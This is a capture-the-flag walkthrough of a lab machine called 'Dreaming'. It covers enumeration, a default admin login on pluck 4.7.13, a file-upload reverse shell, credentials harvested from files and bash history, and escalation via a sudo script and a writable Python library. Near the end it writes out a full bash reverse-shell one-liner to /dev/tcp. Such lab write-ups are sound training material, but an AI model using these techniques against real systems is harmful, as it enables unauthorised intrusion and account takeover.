# Dreaming
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/c8e34692-faa1-44cf-9ccb-6c5783aa2ab1)


## Enumeration
First things first, let's start enumerating on our target. We shall start with an NMAP scan. I usually do two rounds of NMAP: the first being an aggressive scan to find the open ports and the second narrowing down on these open ports to find more details. Note that this may be okay to do in a CTF (unless stealth is required) but in an actual pentesting engagement, you need to be stealthy to avoid detection by IDS that a company may have in place.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/6b02f58c-7d81-460c-9f4d-2c95c654826e)

You immediately find two open ports: 22 and 80. Now let's find more details on those ports.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/fcf7edee-1493-48d0-a044-4c62dd63e345)

You can see the services running on those ports as well as versions and the OS being used. Let's now explore what could be on port 80. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/1448b4f3-073e-42d2-a2b8-8d5f497d100d)

You find this Apache page but let's see if we can find other directories on the site by running a gobuster scan. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/b8fb9c11-1184-45c0-b2c4-cbb32f674cf5)

Let's see what you may find in `/app`

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/26c06cef-d60c-48c9-8474-c43fa0266656)

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/9c9a076e-8fb2-4234-8006-1beaa31e2192)

You can click on `admin` and try to login. 
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/65208f88-774e-4121-8149-41a68c81d2c0)

Before rushing to bruteforce, you could try common passwords to see if they would work. Surprisingly, **password** works. 

## Initial Foothold

While looking around, you could also check if there are vulnerabilities associated with pluck 4.7.13 on exploitdb. The search brings up a File Upload Remote Code Execution exploit. Going through this particular exploit reveals that the final file uploaded is a .phar file so remember to save your exploit as such. Download a php reverse shell from pentestmonkey and add the listening port and IP arguments and then change the extension to .phar. In the `Manage Files` option in the drop-down menu that appears when you point to `Pages`, you will find a section to upload your exploit. Before you do so, ensure that netcat is running with listening port indicated. Upload the .phar file and then click on it in the file section to give you a shell. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/5cce0e37-fee4-404b-bacf-e53c5ccd0351)

Now, let's stabliize this shell by running the commands;

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

`export TERM=xterm;ctrl+Z`

`stty raw -echo;fg`

The first line spawns a better featured bash shell, the second line gives access to term commands such as 'clear' and then backgrounds the shell (ensure you actually press ctrl and Z together) and the final line turns off terminal echo and then foregrounds the shell. 

Now you have a stable shell. You can check how many users are on the computer by listing the names in the home directory and we see that we have `death`, `lucien` and `morpheus`. The first flag you are being asked for in lucien's so let's try and get the flag. Lucien's flag is in his home directory but you do not have access to it so you need to log in to his account. On looking around in the `opt` directory, you find Lucien's password in plain text in the `test.py` file. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/6b9f308f-776c-46d4-95d3-327dec152d69)

Use this password to switch user to lucien. And just like that, we're in! Now you can read the contents of lucien's flag text document. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/aa734ab6-e2a1-49c7-bafc-b886089f169f)

## Lateral Movement
Now that you have been successful in logging in as one of the users, you need to move laterally to get the flags of the other users. Let's try and get into `death`'s account first. Running `sudo -l` reveals that the user lucien can run `getDreams.py` using python3 as the user death. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/8b9d3b97-9f5b-45a7-a661-dc6d3b76db65)

`getDreams.py` is in death's home directory but you (as the user lucien) do not have access it. However, `getDreams.py` also exists in `/opt` and you can assume that this is a copy of the same file in death's home directory. Opening the file in `/opt` shows that it is a script that connects to the mysql database and finds and prints information (dreamer and dream) from `dreams` table. Below is a snippet of it. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/22920cb6-054b-45d8-9219-445ba1c7d7b4)

Now, you can input a command in the table so that running the sudo command will give you a shell as death. But in order to do this, you need to have credentials to the database. The password is redacted in the script but, luckily, you can obtain it from reading the contents of the `.bash_history` file. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/8fbaf5a9-272f-479e-8c04-3fb04e11bdd6)

You'll find that the password is **lucien42DBPASSWORD**. Now you can use this to login to the database and insert a new entry that includes a reverse shell. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/d5cfb992-d08c-45b9-8121-80017721510d)


Now run the sudo command and this will give you a shell. Stabilize the shell as earlier described. 
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/a72c16b7-7a52-493c-b80e-651033ea54c0)


And you find that death's flag is;

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/bc3bc615-31e0-4101-bd00-3d03921451cb)

Now let's try and find a way into Morpheus' account. Since Morpheus cannot run any sudo commands, you should look for files that he can write to using the command;
`find / -type f -writable 2>/dev/null|grep -v proc|grep -v sys| grep -v run|grep -v .local|grep -v .cache`

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/314d69d2-8858-443d-8457-8a71bdd5ac5b)

The result of interest is `/usr/lib/python3.8/shutil.py`
It means we can write to the shutil python library. Looking into Morpheus' home directory, you'll see `restore.py` and from its contents, it uses the shutil library. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/d148d3ec-0236-4e14-9563-3b4d4b1cdf9e)

You can overwrite what is in the library with a reverse shell and then run it using the command;
`echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/[YourIP]/[Listeningport] 0>&1'\")" > /usr/lib/python3.8/shutil.py`
Now, just set up the listener and wait for the script to run and give you a shell. Once it does, you can get the last flag.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/e5dbf0a0-0a3a-48cf-8d7a-b18bccf6fc24)

Note that once you get a shell into Death's account, you can open `getDreams.py` which has the unredacted password. This password also happens to be Death's ssh password and you can ssh into his account and have a better shell than a netcat shell. 
